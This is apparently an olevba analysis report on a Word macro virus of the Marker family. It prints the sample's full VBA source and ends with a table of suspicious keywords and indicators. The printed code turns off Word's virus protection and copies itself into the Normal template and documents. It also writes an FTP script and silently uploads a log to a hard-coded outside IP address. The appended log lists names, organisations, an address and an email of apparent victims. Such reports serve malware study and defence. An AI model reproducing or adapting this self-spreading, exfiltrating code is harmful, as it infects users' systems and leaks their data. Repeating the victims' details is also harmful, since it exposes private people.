olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-d03b96b05fac626c78895177c699c30c5d3b83df
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-d03b96b05fac626c78895177c699c30c5d3b83df - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
End With
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
Found = False
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
    If a <> "" And Found = True Then Print #1, a
    If a = "End Sub" And Found = True Then Found = False
Next i
Close #1
j = 1
k = 1
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    t = t + 1
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
End If
If t > 0 Then
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            j = j + 1
        End If
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            k = k + 1
        End If
    Loop
quit:
    Close #1
End If
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Execute:
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 10:42:25 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 02:25:08 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:28:09 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 06:56:46 PM - Monday, 11 Jan 1999
' Kay Helgerson
'



' 06:01:43 PM - Tuesday, 26 Jan 1999
' Ayenda M. Lambert
'



' 09:06:30 AM - Monday, 1 Feb 1999
' Dee Carr
'



' 11:49:14  - torsdag, 4 feb 1999
' Henrik Hansen
'



' 03:45:07  - mandag, 8 feb 1999
' JPW pĺ PC2333
'



' 08:23:50  - onsdag, 10 feb 1999
' RHG pĺ PC1439
'



' 11:27:32  - onsdag, 10 feb 1999
' CBB pĺ PC0688
'



' 11:27:38  - torsdag, 11 feb 1999
' PLN pĺ PC1723
'



' 03:13:28  - mandag, 15 feb 1999
' TRJ pĺ PC2308
'



' 01:52:51  - piątek, 19 II 1999
' Jacek Spychalski
' jacek.spychalski@centertel.pl



' 09:40:06  - czwartek, 11 mar 1999
' MF
'



' 11:46:49  - piątek, 12 mar 1999
' OPTIMUS
'



' 03:09:16  - piątek, 26 mar 1999
' Kwiatkowski
'



' 03:03:25 PM - środa, 31 mar 1999
' Pracowik InfoViDE
'



' 02:46:18  - piątek, 9 kwi 1999
' OPTIMUS
'



' 03:43:52  - wtorek, 20 IV 1999
' Andrzej Wardziński
'



' 01:28:01  - poniedziałek, 10 maj 1999
' Beata Jerzok
'



' 02:47:46  - środa, 12 maj 1999
' JozwikB
'



' 08:38:44  - wtorek, 1 cze 1999
' ZUS
'



' 12:30:20  - wtorek, 8 cze 1999
' PodgórskaD
'



' 09:56:14  - piątek, 18 cze 1999
' LisowskaG
'



' 01:07:57  - środa, 30 cze 1999
' ZajacJ
' ul. Zielona 4
' 58-307 Wałbrzych



' 10:35:25  - poniedziałek, 11 paź 1999
' TrynerM
'



' 02:32:29  - poniedziałek, 25 paź 1999
' TrynerM
'



' 08:09:51  - czwartek, 18 XI 1999
' ZUS
'



' 11:24:06  - czwartek, 18 lis 1999
' PutyraM
'



' 10:50:26  - piątek, 19 lis 1999
' RoslenJ
'



' 09:17:35  - środa, 24 lis 1999
' DabkowskaD
'



' 07:44:33  - piątek, 3 gru 1999
' SobanskiM
'



' 06:45:50  - wtorek, 14 gru 1999
' BiernackiT
'



' 02:08:20  - środa, 15 gru 1999
' JonczykD
'



' 12:54:58  - środa, 22 gru 1999
' Ros
'



' 09:37:26  - poniedziałek, 17 sty 2000
' ros1010
'



' 02:42:36  - środa, 26 sty 2000
' ros1010
'



' 09:19:04  - czwartek, 19 lip 2001
' ros1010
'



' 02:12:22  - środa, 15 maj 2002
' ros1010
'



' 08:41:52  - wtorek, 30 lip 2002
' ros1010
'



' 10:29:23  - wtorek, 29 paź 2002
' kurs
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

